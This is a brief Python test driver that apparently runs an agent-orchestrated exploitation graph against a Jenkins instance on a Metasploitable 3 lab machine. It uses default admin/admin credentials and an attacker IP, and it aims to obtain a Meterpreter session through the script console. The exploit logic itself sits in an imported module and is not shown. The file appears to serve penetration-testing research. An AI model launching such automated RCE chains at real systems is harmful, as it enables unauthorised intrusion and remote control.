"""
Live test driver for examples/jenkins_rce_graph.py.

Credentialed web-app exploitation chain against Metasploitable 3's Jenkins
on port 8484. Default lab creds are admin/admin. Expected to land a Java
Meterpreter session via the script console.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.orchestrator import run_graph
from examples.jenkins_rce_graph import build_jenkins_rce_graph

TARGET_IP = "192.168.34.7"
ATTACKER_IP = "192.168.34.6"

if __name__ == "__main__":
    graph = build_jenkins_rce_graph(target_ip=TARGET_IP, attacker_ip=ATTACKER_IP)
    print(f"Loaded graph: {graph.name}  ({len(graph.nodes)} nodes, {len(graph.edges)} edges)")
    print(f"Running with explore=True, use_judge=True against {TARGET_IP}...")
    run_graph(graph, explore=True, use_judge=True)
